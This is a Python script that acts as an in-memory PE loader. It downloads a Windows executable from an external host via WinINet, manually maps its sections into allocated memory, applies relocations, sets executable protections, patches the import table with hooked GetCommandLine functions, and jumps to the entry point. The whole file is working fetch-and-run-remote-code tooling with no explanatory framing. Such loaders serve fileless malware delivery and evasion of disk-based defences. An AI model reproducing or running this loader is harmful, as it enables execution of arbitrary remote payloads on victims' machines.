import ctypes
import sys
from ctypes import wintypes
import pefile
import struct

# === Windows API ===
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
wininet = ctypes.WinDLL('wininet', use_last_error=True)

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READONLY = 0x02

IMAGE_REL_BASED_DIR64 = 10

# Callback functions that need to stay alive
_callbacks = []

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = wintypes.LPVOID
VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]

VirtualProtect = kernel32.VirtualProtect
VirtualProtect.restype = wintypes.BOOL
VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]

LoadLibraryA = kernel32.LoadLibraryA
LoadLibraryA.restype = wintypes.HMODULE
LoadLibraryA.argtypes = [ctypes.c_char_p]

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.restype = ctypes.c_void_p
GetProcAddress.argtypes = [wintypes.HMODULE, ctypes.c_char_p]

InternetOpenA = wininet.InternetOpenA
InternetOpenA.restype = wintypes.HANDLE
InternetOpenA.argtypes = [ctypes.c_char_p, wintypes.DWORD, ctypes.c_char_p, ctypes.c_char_p, wintypes.DWORD]

InternetOpenUrlA = wininet.InternetOpenUrlA
InternetOpenUrlA.restype = wintypes.HANDLE
InternetOpenUrlA.argtypes = [wintypes.HANDLE, ctypes.c_char_p, ctypes.c_char_p, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD]

InternetReadFile = wininet.InternetReadFile
InternetReadFile.restype = wintypes.BOOL
InternetReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]

InternetCloseHandle = wininet.InternetCloseHandle
InternetCloseHandle.restype = wintypes.BOOL
InternetCloseHandle.argtypes = [wintypes.HANDLE]


def load_pe_in_memory():
    url = b"https://share.g3tsyst3m.online/shared-files/winexec_nonulls.exe"
    agent = b"Mozilla/5.0"

    print("[INFO] Downloading PE...")
    hInternet = InternetOpenA(agent, 0, None, None, 0)
    if not hInternet:
        print(f"[!] InternetOpenA failed: {ctypes.get_last_error()}")
        return False

    hUrl = InternetOpenUrlA(hInternet, url, None, 0, 0, 0)
    if not hUrl:
        print(f"[!] InternetOpenUrlA failed: {ctypes.get_last_error()}")
        InternetCloseHandle(hInternet)
        return False

    file_buffer = bytearray()
    chunk = ctypes.create_string_buffer(4096)
    bytes_read = wintypes.DWORD(0)

    while True:
        if not InternetReadFile(hUrl, chunk, 4096, ctypes.byref(bytes_read)) or bytes_read.value == 0:
            break
        file_buffer.extend(chunk.raw[:bytes_read.value])

    InternetCloseHandle(hUrl)
    InternetCloseHandle(hInternet)

    if not file_buffer:
        print("[-] Failed to download data.")
        return False

    print(f"[INFO] Downloaded {len(file_buffer)} bytes.")

    pe = pefile.PE(data=bytes(file_buffer))

    image_base = VirtualAlloc(None, pe.OPTIONAL_HEADER.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not image_base:
        print(f"[!] VirtualAlloc failed: {ctypes.get_last_error()}")
        return False

    print(f"[INFO] Image allocated at 0x{image_base:016X}")
    image_base_ptr = ctypes.c_void_p(image_base)

    # Zero out the entire allocation first
    zero_buffer = bytes(pe.OPTIONAL_HEADER.SizeOfImage)
    ctypes.memmove(image_base_ptr, zero_buffer, pe.OPTIONAL_HEADER.SizeOfImage)

    # Copy headers + sections
    ctypes.memmove(image_base_ptr, bytes(file_buffer), pe.OPTIONAL_HEADER.SizeOfHeaders)

    print(f"[INFO] Mapping {len(pe.sections)} sections...")
    for section in pe.sections:
        dest = ctypes.c_void_p(image_base + section.VirtualAddress)
        size = section.SizeOfRawData
        name = section.Name.decode(errors='ignore').strip()
        print(f"[INFO] Mapping {name} at VA 0x{section.VirtualAddress:08X}, size {size}")
        if size > 0:
            ctypes.memmove(dest, bytes(file_buffer)[section.PointerToRawData:section.PointerToRawData + size], size)

    # Relocations
    delta = image_base - pe.OPTIONAL_HEADER.ImageBase
    if delta != 0:
        print(f"[INFO] Applying relocations (delta = 0x{delta:X})...")
        reloc_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_BASERELOC']]
        if reloc_dir.Size > 0:
            reloc_data = pe.get_data(reloc_dir.VirtualAddress, reloc_dir.Size)
            offset = 0
            while offset < len(reloc_data):
                if offset + 8 > len(reloc_data): break
                page_rva = int.from_bytes(reloc_data[offset:offset+4], 'little')
                block_size = int.from_bytes(reloc_data[offset+4:offset+8], 'little')
                if block_size < 8: break
                for i in range(offset + 8, offset + block_size, 2):
                    if i + 1 >= offset + block_size: break
                    entry = int.from_bytes(reloc_data[i:i+2], 'little')
                    type_ = entry >> 12
                    off = entry & 0xFFF
                    if type_ == IMAGE_REL_BASED_DIR64:
                        patch_addr = image_base + page_rva + off
                        buf = (ctypes.c_char * 8).from_address(patch_addr)
                        current = int.from_bytes(buf, 'little', signed=False)
                        new_val = current + delta
                        ctypes.memmove(ctypes.c_void_p(patch_addr), new_val.to_bytes(8, 'little', signed=False), 8)
                offset += block_size

    # === Set protections BEFORE imports (critical) ===
    print("[INFO] Setting section protections before imports...")
    for section in pe.sections:
        protect = PAGE_READONLY
        chars = section.Characteristics
        if chars & 0x20000000:  # EXECUTE
            protect = PAGE_EXECUTE_READWRITE if (chars & 0x40000000) else PAGE_EXECUTE_READ
        elif chars & 0x40000000:  # WRITE
            protect = PAGE_READWRITE

        old = wintypes.DWORD(0)
        success = VirtualProtect(ctypes.c_void_p(image_base + section.VirtualAddress),
                                 section.Misc_VirtualSize, protect, ctypes.byref(old))
        if not success:
            print(f"[!] VirtualProtect failed for section {section.Name.decode(errors='ignore').strip()}")

    # Create wrapper functions for command line
    @ctypes.CFUNCTYPE(ctypes.c_char_p)
    def fake_GetCommandLineA():
        return b""

    @ctypes.CFUNCTYPE(ctypes.c_wchar_p)
    def fake_GetCommandLineW():
        return ""

    # Keep them alive
    _callbacks.append(fake_GetCommandLineA)
    _callbacks.append(fake_GetCommandLineW)

    # Resolve imports
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        print("[INFO] Resolving imports...")
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode(errors='ignore')
            print(f"[INFO] Loading DLL: {dll_name}")
            h_module = LoadLibraryA(dll_name.encode('utf-8'))
            if not h_module:
                print(f"[!] Failed to load {dll_name}")
                continue

            for imp in entry.imports:
                if imp.name:
                    func = imp.name.decode(errors='ignore')
                    # Hook GetCommandLine functions
                    if func == "GetCommandLineA":
                        proc = ctypes.cast(fake_GetCommandLineA, ctypes.c_void_p).value
                    elif func == "GetCommandLineW":
                        proc = ctypes.cast(fake_GetCommandLineW, ctypes.c_void_p).value
                    else:
                        proc = GetProcAddress(h_module, func.encode('utf-8'))
                else:
                    proc = GetProcAddress(h_module, ctypes.c_void_p(imp.ordinal))

                if proc:
                    iat_rva = imp.address - pe.OPTIONAL_HEADER.ImageBase
                    iat_addr = image_base + iat_rva
                    print(f"[DEBUG] IAT entry: func={func if 'func' in locals() else 'ordinal'}, proc=0x{proc:X}, iat_rva=0x{iat_rva:X}, iat_addr=0x{iat_addr:X}")

                    # Temporarily make memory writable for IAT
                    old = wintypes.DWORD(0)
                    prot_result = VirtualProtect(ctypes.c_void_p(iat_addr), 8, PAGE_READWRITE, ctypes.byref(old))
                    if not prot_result:
                        print(f"[!] VirtualProtect failed at 0x{iat_addr:X}: {ctypes.get_last_error()}")
                        continue

                    try:
                        proc_bytes = struct.pack('<Q', proc)
                        ctypes.memmove(ctypes.c_void_p(iat_addr), proc_bytes, 8)
                    except Exception as e:
                        print(f"[!] Failed to write IAT at 0x{iat_addr:X}: {e}")
                    finally:
                        VirtualProtect(ctypes.c_void_p(iat_addr), 8, old.value, ctypes.byref(old))
                else:
                    print(f"[!] Failed to resolve {func if 'func' in locals() else 'ordinal'}")

    # Call entry point with proper WinMain arguments
    entry_point = image_base + pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print(f"[INFO] Entry point RVA: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:X}")
    print(f"[INFO] Calling entry point at 0x{entry_point:016X}")

    WinMainFunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_int)
    entry_func = WinMainFunc(entry_point)
    try:
        result = entry_func(image_base, None, None, 1)
        print(f"[INFO] PE executed with result: {result}")
    except Exception as e:
        print(f"[!] Entry point exception: {e}")

    return True


if __name__ == "__main__":
    try:
        if not load_pe_in_memory():
            print("[!] Failed to load PE")
            sys.exit(1)
    except Exception as e:
        print(f"[EXCEPTION] {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)